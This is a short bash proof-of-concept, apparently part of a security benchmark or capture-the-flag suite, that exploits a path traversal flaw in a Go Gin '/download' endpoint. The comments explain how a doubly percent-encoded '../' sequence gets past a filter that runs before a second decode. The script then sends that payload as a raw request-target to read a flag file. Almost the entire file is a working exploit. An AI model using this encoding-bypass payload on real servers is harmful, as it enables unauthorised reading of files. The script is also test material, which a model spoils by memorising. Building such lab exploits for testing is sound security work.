#!/usr/bin/env bash
# APEX-015-25 — "Path Traversal with Encoding Bypass" (tags: path_traversal, go)
#
# `/download` strips `../` from the filename and then calls
# `url.QueryUnescape` on what is left. Gin has already decoded the query once by
# the time the handler sees it, so a doubly-encoded `../` arrives as the text
# `%2e%2e%2f`, survives a filter looking for slashes and dots, and is turned
# back into `../` by the decode that runs after the filter.
#
# `--raw-target` is the point of this one. The ordinary send builds its
# request-target from a parsed URL, and a parser that percent-decodes before the
# request exists would hand the server `../` — the payload the filter catches,
# and a 404 that says nothing about the request that was asked for. With
# `--raw-target` the bytes go to the socket as written.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex015-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

UP='%252e%252e%252f'

"$H5I" browser open "$URL/api/files" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 \
    --raw-target "/download?file=$UP$UP$UP$UP$UP$UP/flag" |
    flag
